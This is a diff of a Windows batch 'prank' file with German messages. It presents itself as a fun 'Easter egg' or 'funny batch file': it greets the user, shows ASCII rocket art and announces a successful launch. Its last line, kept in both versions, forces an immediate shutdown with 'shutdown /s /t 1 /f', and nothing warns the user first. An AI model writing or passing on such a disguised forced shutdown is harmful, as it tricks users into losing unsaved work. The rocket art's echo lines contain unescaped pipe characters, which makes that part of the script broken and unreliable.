@@ -1,20 +1,28 @@
 @echo off
-echo Welcome to the Easter EGG!
-echo Now You will see the Easter EGG
+title Lustige Batch-Datei
 
-rem 
+echo Willkommen zur coolen Batch-Datei!
+echo Hier passiert etwas Cooles...
+
+rem Warte für 2 Sekunden
 timeout /nobreak /t 2 >nul
 
 echo Bereit für eine Überraschung?
 
-rem 
+rem Zeige ein ASCII-Art-Raketenstart
 echo.
-echo   :-)
+echo   /\
+echo  |**|
+echo  |**|
+echo  |**|
 echo.
 
-rem 
+rem Warte für 3 Sekunden
 timeout /nobreak /t 3 >nul
 
-echo Spaß beendet! Auf Wiedersehen!
-shutdown /s /t 0 /f
+echo Raketenstart erfolgreich!
 
+rem Warte für 5 Sekunden
+timeout /nobreak /t 5 >nul
+
+shutdown /s /t 1 /f
